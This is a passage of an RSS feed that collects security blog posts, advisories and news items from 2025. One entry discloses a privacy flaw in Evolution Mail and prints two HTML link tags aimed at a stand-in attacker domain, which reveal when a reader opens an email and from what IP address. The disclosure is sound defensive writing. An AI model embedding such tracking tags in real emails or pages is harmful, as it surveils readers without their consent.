Analysis</title><link>https://www.n00py.io/2025/04/identifying-new-attack-paths-via-password-analysis/</link><description>Check out my talk from Wild West Hacking Fest &amp;#8211; Mile High 2025 here: &amp;#160; Slides:</description><pubDate>Mon, 21 Apr 2025 08:56:09 +0000</pubDate></item><item><title>Make Deployment Systems Tier 0 Again: Pentesting PDQ Deploy and Inventory</title><link>https://trustfoundry.net/2025/04/30/pentesting-pdq-deploy-and-inventory/</link><description>&lt;p&gt;Make Deployment Systems Tier 0 Again: Pentesting PDQ Deploy and Inventory Preamble Over the past...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2025/04/30/pentesting-pdq-deploy-and-inventory/"&gt;Make Deployment Systems Tier 0 Again: Pentesting PDQ Deploy and Inventory&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Wed, 30 Apr 2025 16:03:20 +0000</pubDate></item><item><title>Staying Ahead of Evolving Threats with SecOps and SOAR</title><link>https://www.optiv.com/insights/discover/blog/staying-ahead-evolving-threats-secops-and-soar</link><description>See how modern SecOps strategies and SOAR platforms can help organizations close talent gaps, improve tool integration and proactively face complex threats.</description><pubDate>Mon, 02 Jun 2025 13:48:00 +0000</pubDate></item><item><title>Why IoT Security Must Be a Top Priority for Modern Enterprises</title><link>https://www.optiv.com/insights/discover/blog/why-iot-security-must-be-top-priority-modern-enterprises</link><description>Understand the growing risks and actionable strategies to strengthen your IoT security posture.</description><pubDate>Tue, 03 Jun 2025 10:07:00 +0000</pubDate></item><item><title>Depscanner: Find orphaned packages before the bad guys do</title><link>https://sensepost.com/blog/2025/depscanner-find-orphaned-packages-before-the-bad-guys-do/</link><description>Context</description><pubDate>Tue, 03 Jun 2025 15:20:54 +0000</pubDate></item><item><title>Optiv Earns Cisco Gold Provider Status: A Milestone in Strengthening Cybersecurity Resilience</title><link>https://www.optiv.com/insights/discover/blog/optiv-earns-cisco-gold-provider-status-milestone-strengthening-cybersecurity</link><description>Optiv is proud to announce we have been named a Cisco Gold Provider, a designation of a decades-long collaboration with Cisco to help our clients secure their digital future.</description><pubDate>Wed, 04 Jun 2025 09:55:00 +0000</pubDate></item><item><title>AI and MDR: Smarter Cybersecurity for Modern Threats</title><link>https://www.optiv.com/insights/discover/blog/ai-threat-detection-mdr</link><description>Discover how AI and Google SecOps elevate MDR with automation, analytics and efficiency. Learn how to secure your organization with AI-driven strategies.</description><pubDate>Thu, 05 Jun 2025 01:50:00 +0000</pubDate></item><item><title>Full Disclosure, GraphGhost: Are You Afraid of Failed Logins?</title><link>https://trustedsec.com/blog/full-disclosure-graphghost-are-you-afraid-of-failed-logins</link><description>&amp;lt;p&amp;gt;Another year, another vuln…It&amp;#039;s that time again.Last year I disclosed the existence of GraphNinja - a (now fixed) vulnerability in Azure where you could password spray and remain undetected. Well, the Ghost of…&amp;lt;/p&amp;gt;</description><pubDate>Thu, 05 Jun 2025 04:00:00 +0000</pubDate></item><item><title>A Better Way to Protect Your Data: Strong Data Security and Governance</title><link>https://www.optiv.com/insights/discover/blog/better-way-protect-your-data-strong-data-security-and-governance</link><description>Effective data protection is more than tools and firewalls; it's a well-rounded strategy built on robust data governance and privacy practices. See how it works.</description><pubDate>Thu, 05 Jun 2025 12:12:00 +0000</pubDate></item><item><title>Smarter MDR: Insights into Better Protection for Your Business</title><link>https://www.optiv.com/insights/discover/blog/smarter-mdr-insights-better-protection-your-business</link><description>What does it really take to implement an MDR solution that works? Consider risk tolerance, capabilities, costs, partnerships and more — outlined in this blog.</description><pubDate>Thu, 05 Jun 2025 13:07:00 +0000</pubDate></item><item><title>SASE Uncovered: Benefits of Converging Network and Security</title><link>https://www.optiv.com/insights/discover/blog/sase-uncovered-benefits-converging-network-and-security</link><description>SASE is more than a buzzword. See how converging network and security changes the game for resilient, future-ready organizations.</description><pubDate>Thu, 05 Jun 2025 13:27:00 +0000</pubDate></item><item><title>Common Mobile Device Threat Vectors</title><link>https://trustedsec.com/blog/common-mobile-device-threat-vectors</link><description>&amp;lt;p&amp;gt;Mobile devices are a must have in today’s world for communication. With that being said, these devices do come with some risks when it comes to personal data. Common mobile device threat vectors include various attack…&amp;lt;/p&amp;gt;</description><pubDate>Tue, 10 Jun 2025 04:00:00 +0000</pubDate></item><item><title>Hunting Deserialization Vulnerabilities With Claude</title><link>https://trustedsec.com/blog/hunting-deserialization-vulnerabilities-with-claude</link><description>&amp;lt;p&amp;gt;In this post, we are going to look at how we can find zero-days in .NET assemblies using Model Context Protocol (MCP).SetupBefore we can start vibe hacking, we need an MCP that will allow Claude to disassemble .NET…&amp;lt;/p&amp;gt;</description><pubDate>Thu, 12 Jun 2025 04:00:00 +0000</pubDate></item><item><title>Dragging Secrets Out of Chrome: NTLM Hash Leaks via File URLs</title><link>https://trustedsec.com/blog/dragging-secrets-out-of-chrome-ntlm-hash-leaks-via-file-urls</link><description>&amp;lt;p&amp;gt;Figure 1 - We take our work very seriously. Capturing Hashes with DragonHashChromium-based browsers have an odd feature set that allows extensive drag-and-drop capabilities in the browser. This feature is not only…&amp;lt;/p&amp;gt;</description><pubDate>Fri, 13 Jun 2025 04:00:00 +0000</pubDate></item><item><title>Attacking JWT using X509 Certificates</title><link>https://trustedsec.com/blog/attacking-jwt-using-x509-certificates</link><description>&amp;lt;p&amp;gt;Take a closer look at JWT signature verification using X.509 headers as we walk through an attack and demonstrate a Burp extension to exploit a known vulnerability by targeting two headers used in some JWT setups.&amp;lt;/p&amp;gt;</description><pubDate>Tue, 17 Jun 2025 04:00:00 +0000</pubDate></item><item><title>NIST CSF 2.0 Ratings and Assessment Methodologies for Scorecards – When the Math isn’t “Mathing”</title><link>https://trustedsec.com/blog/nist-csf-2-0-ratings-and-assessment-methodologies-for-scorecards-when-the-math-isnt-mathing</link><description>&amp;lt;p&amp;gt;As a Senior Security Consultant and National Institute of Standards and Technology (NIST) expert, the question I get asked the most is, how do we compare scores and maturity ratings from version 1.1 to version 2.0?…&amp;lt;/p&amp;gt;</description><pubDate>Tue, 24 Jun 2025 04:00:00 +0000</pubDate></item><item><title>No Egress, No Shell, No Problem</title><link>https://sensepost.com/blog/2025/no-egress-no-shell-no-problem/</link><description>Context, context, context; Alright, imagine this &amp;amp;#x2013;  you&amp;amp;#x2019;re on an engagement, find a few vulnerabilities, run a few exploits and next thing you know you have Remote Code Execution (RCE).</description><pubDate>Thu, 26 Jun 2025 07:35:59 +0000</pubDate></item><item><title>Abusing Chrome Remote Desktop on Red Team Operations: A Practical Guide</title><link>https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide</link><description>&amp;lt;p&amp;gt;In this post, we’ll be exploring a practical technique for abusing Chrome Remote Desktop (also known as Google Remote Desktop) within a Red Team operation. I sometimes find myself needing to use legitimate software to…&amp;lt;/p&amp;gt;</description><pubDate>Tue, 01 Jul 2025 04:00:00 +0000</pubDate></item><item><title>First Quarter 2025 Ransomware Trends</title><link>https://www.optiv.com/insights/discover/blog/first-quarter-2025-ransomware-trends</link><description>Optiv's Global Threat Intelligence Center (gTIC) analyzes the increase in ransomware victims and variants, outlining key trends, threat actors and the evolving ransomware landscape.</description><pubDate>Thu, 03 Jul 2025 05:49:00 +0000</pubDate></item><item><title>CBP Wants New Tech to Search for Hidden Data on Seized Phones</title><link>https://www.wired.com/story/cbp-wants-new-tech-to-search-for-hidden-data-on-seized-phones/</link><description>Customs and Border Protection is asking companies to pitch tools for performing deep analysis on the contents of devices seized at the US border.</description><pubDate>Thu, 03 Jul 2025 17:19:59 +0000</pubDate></item><item><title>Trump Officials Want to Prosecute Over the ICEBlock App. Lawyers Say That’s Unconstitutional</title><link>https://www.wired.com/story/trump-officials-want-to-prosecute-over-the-iceblock-app-lawyers-say-thats-unconstitutional/</link><description>The platform, which allows users to anonymously share the locations of ICE agents, is currently the third-most-downloaded iPhone app.</description><pubDate>Thu, 03 Jul 2025 18:06:17 +0000</pubDate></item><item><title>The Person in Charge of Testing Tech for US Spies Has Resigned</title><link>https://www.wired.com/story/iarpa-director-resigns-odni/</link><description>IARPA director Rick Muller is departing after just over a year at the R&amp;amp;D unit that invests in emerging technologies of potential interest to agencies like the NSA and the CIA, WIRED has learned.</description><pubDate>Thu, 03 Jul 2025 20:50:33 +0000</pubDate></item><item><title>Android May Soon Warn You About Fake Cell Towers</title><link>https://www.wired.com/story/android-may-soon-warn-you-about-fake-cell-towers/</link><description>Plus: Iran-linked hackers threaten to release Trump campaign emails, Chinese hackers still in US telecoms networks, and an abusive deepfake website plans an expansion.</description><pubDate>Sat, 05 Jul 2025 10:30:00 +0000</pubDate></item><item><title>CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe</title><link>https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe</link><description>&amp;lt;p&amp;gt;While digging into the internals of my new Lenovo ThinkPad P1 Gen7, I came across an unexpected discovery that quickly escalated from curiosity to a viable privilege escalation vulnerability.  Every day at exactly…&amp;lt;/p&amp;gt;</description><pubDate>Tue, 08 Jul 2025 04:00:00 +0000</pubDate></item><item><title>Evolution Mail Users Easily Trackable</title><link>https://www.grepular.com/Evolution_Mail_Users_Easily_Trackable</link><description>&lt;p&gt;Evolution Mail’s “Load Remote Content” option, as a privacy protection feature doesn’t work. They know it doesn’t work. It hasn’t worked for years and there is no sign it will be fixed any time soon.&lt;/p&gt;
&lt;p&gt;I discovered the other day that if a HTML email contains a tag like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;link &lt;span class="hljs-attribute"&gt;rel&lt;/span&gt;=&lt;span class="hljs-string"&gt;"dns-prefetch"&lt;/span&gt; &lt;span class="hljs-attribute"&gt;href&lt;/span&gt;=&lt;span class="hljs-string"&gt;"https://trackingcode.attackersdomain.example.com"&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then when an email is opened in Evolution Mail, a DNS request for trackingcode.attackersdomain.example.com is performed. This happens with remote content disabled, and without clicking the button to fetch it. The sender can look at their DNS logs to see if you’ve read your email, and the IP address of your DNS resolver at that time, which may indicate your location.&lt;/p&gt;
&lt;p&gt;I opened a &lt;a href="https://gitlab.gnome.org/GNOME/evolution/-/issues/3095"&gt;bug report&lt;/a&gt; with Evolution Mail, and they blamed WebKitGTK for this situation and have closed my ticket as a &lt;a href="https://gitlab.gnome.org/GNOME/evolution/-/issues/2727"&gt;duplicate of another ticket&lt;/a&gt; which was opened in April 2024. That ticket reported a different but similar bug:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;link &lt;span class="hljs-attribute"&gt;href&lt;/span&gt;=&lt;span class="hljs-string"&gt;"trackingcode.attackersdomain.example.com"&lt;/span&gt; &lt;span class="hljs-attribute"&gt;rel&lt;/span&gt;=&lt;span class="hljs-string"&gt;"preconnect"&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This apparently triggers a connection when you read an email, even without clicking to load remote content. An attacker could look at the SNI header during the TLS negotiation to identify the unique reader of such an email, and it would grant them their IP address.&lt;/p&gt;
&lt;p&gt;This one &lt;a href="https://bugs.webkit.org/show_bug.cgi?id=259787"&gt;links back to a webkit bug&lt;/a&gt; which was opened in August 2023, which also suggests there will be other such leaks, and which shows no sign of being dealt with.&lt;/p&gt;
&lt;p&gt;I suggested that maintaining a whitelist of allowed html tags and attributes, and stripping them before passing the email html onto a web browser would be a good defense in depth strategy, but this looks unlikely to be followed.&lt;/p&gt;
&lt;p&gt;So my suggestion is: If you care about having privacy when reading your email, uninstall Evolution Mail. It doesn’t protect your privacy, and the devs don’t consider that to be their responsibility.&lt;/p&gt;</description><pubDate>Wed, 09 Jul 2025 17:24:36 +0000</pubDate></item><item><title>McDonald’s AI Hiring Bot Exposed Millions of Applicants' Data to Hackers Using the Password ‘123456’</title><link>https://www.wired.com/story/mcdonalds-ai-hiring-chat-bot-paradoxai/</link><description>Basic security flaws left the personal info of tens of millions of McDonald’s job-seekers vulnerable on the “McHire” site built by AI software firm Paradox.ai.</description><pubDate>Wed, 09 Jul 2025 19:28:50 +0000</pubDate></item><item><title>Identity Resolution</title><link>https://www.optiv.com/insights/discover/blog/identity-resolution</link><description>Identity is the new perimeter. Learn how Varonis Identity Protection closes gaps in identity and data security and ensures your organization stays secure.</description><pubDate>Thu, 10 Jul 2025 03:05:00 +0000</pubDate></item><item><title>Azure's Front Door WAF WTF: IP Restriction Bypass</title><link>https://trustedsec.com/blog/azures-front-door-waf-wtf-ip-restriction-bypass</link><description>&amp;lt;p&amp;gt;The Azure Front Door Web Application Firewall (WAF) has an "IP restriction" option that can be bypassed with the inclusion of an HTTP header. What&amp;#039;s worse? This is actually expected behavior. Figure 1 - WHY???…&amp;lt;/p&amp;gt;</description><pubDate>Thu, 10 Jul 2025 04:00:00 +0000</pubDate></item><item><title>Google Chrome to Distrust Chunghwa &amp; Netlock Certificates: How Qualys Certificate View Helps You Respond</title><link>https://blog.qualys.com/category/product-tech/vulnmgmt-detection-response</link><description>In a major change to the global certificate ecosystem, Google Chrome has announced that it will no longer trust any new digital certificates issued by Chunghwa Telecom and Netlock, two long-standing Certificate Authorities (CAs), after July 31, 2025. This move is part of Chrome’s ongoing efforts to improve TLS certificate trust, hold Certificate Authorities (CAs) [&amp;#8230;]</description><pubDate>Thu, 10 Jul 2025 07:28:38 +0000</pubDate></item><item><title>Achieving Zero-Disruption Patch Management with Qualys’ Latest Capabilities</title><link>https://blog.qualys.com/category/product-tech</link><description>Keeping systems patched is essential, but doing it efficiently and confidently is what sets great IT operations apart. With the latest capabilities in Qualys Patch Management, you can achieve just that. The most recent advancements in Qualys Patch Management – Intelligent Job Chaining and Pre-condition Checks – empower IT teams to patch with greater efficiency [&amp;#8230;]</description><pubDate>Thu, 10 Jul 2025 16:00:00 +0000</pubDate></item><item><title>DHS Tells Police That Common Protest Activities Are ‘Violent Tactics’</title><link>https://www.wired.com/story/dhs-tells-police-that-common-protest-activities-are-violent-tactics/</link><description>DHS is urging law enforcement to treat even skateboarding and livestreaming as signs of violent intent during a protest, turning everyday behavior into a pretext for police action.</description><pubDate>Thu, 10 Jul 2025 21:58:09 +0000</pubDate></item><item><title>Metadata Shows the FBI’s ‘Raw’ Jeffrey Epstein Prison Video Was Likely Modified</title><link>https://www.wired.com/story/metadata-shows-the-dojs-raw-jeffrey-epstein-prison-video-was-likely-modified/</link><description>There is no evidence the footage was deceptively manipulated, but ambiguities around how the video was processed may further fuel conspiracy theories about Epstein’s death.</description><pubDate>Fri, 11 Jul 2025 16:23:55 +0000</pubDate></item><item><title>4 Arrested Over Scattered Spider Hacking Spree</title><link>https://www.wired.com/story/4-arrested-over-scattered-spider-hacking-spree/</link><description>Plus: An “explosion” of AI-generated child abuse images is taking over the web, a Russian professional basketball player is arrested on ransomware charges, and more.</description><pubDate>Sat, 12 Jul 2025 10:30:00 +0000</pubDate></item><item><title>Cybersecurity Leadership in 2025: The Strategic Role of CISOs in an AI-Driven Era</title><link>https://www.optiv.com/insights/discover/blog/cybersecurity-leadership-2025-strategic-role-cisos-ai-driven-era</link><description>AI has reshaped the threat landscape, compelling CISOs to rethink their cybersecurity strategies. Discover the strategic priorities of CISOs in 2025 and beyond.</description><pubDate>Mon, 14 Jul 2025 08:15:00 +0000</pubDate></item><item><title>AI 'Nudify' Websites Are Raking in Millions of Dollars</title><link>https://www.wired.com/story/ai-nudify-websites-are-raking-in-millions-of-dollars/</link><description>Millions of people are accessing harmful AI “nudify” websites. New analysis says the sites are making millions and rely on tech from US companies.</description><pubDate>Mon, 14 Jul 2025 11:00:00 +0000</pubDate></item><item><title>The State of Cyber Risk 2025: Business Context Needed</title><link>https://blog.qualys.com/category/qualys-insights</link><description>The cyber risk conversation is changing. Momentum is growing for formal cyber risk programs. However, despite rising investments, evolving frameworks, and more vocal boardroom interest, new data reveals that most organizations remain immature in their risk management programs, and cyber risk is rising. As digital transformation accelerates and AI-powered threats emerge, the question is no [&amp;#8230;]</description><pubDate>Mon, 14 Jul 2025 15:00:00 +0000</pubDate></item><item><title>HIPAA, HITECH, and HITRUST - It’s HI Time to Make Sense of it All</title><link>https://trustedsec.com/blog/hipaa-hitech-and-hitrust-its-high-time-to-make-sense-of-it-all</link><description>&amp;lt;p&amp;gt;Organizations in the health care sector and those that work with it often hear about HIPAA, HITECH, and HITRUST compliance but may not understand what they all are and what they have to do with each other. This post…&amp;lt;/p&amp;gt;</description><pubDate>Tue, 15 Jul 2025 04:00:00 +0000</pubDate></item><item><title>The FBI's Jeffrey Epstein Prison Video Had Nearly 3 Minutes Cut Out</title><link>https://www.wired.com/story/the-fbis-jeffrey-epstein-prison-video-had-nearly-3-minutes-cut-out/</link><description>Metadata from the “raw” Epstein prison video shows approximately 2 minutes and 53 seconds were removed from one of two stitched-together clips. The cut starts right at the “missing minute.”</description><pubDate>Tue, 15 Jul 2025 19:40:27 +0000</pubDate></item><item><title>Oracle Critical Patch Update, July 2025 Security Update Review</title><link>https://blog.qualys.com/category/vulnerabilities-threat-research</link><description>Oracle released its second quarterly edition of this year’s Critical Patch Update. The update received patches for 309 security vulnerabilities. Some of the vulnerabilities addressed in this update impact more than one product. These patches address vulnerabilities in various product families, including third-party components in Oracle products. In this quarterly Oracle Critical Patch Update, Oracle [&amp;#8230;]</description><pubDate>Wed, 16 Jul 2025 14:55:11 +0000</pubDate></item></channel></rss>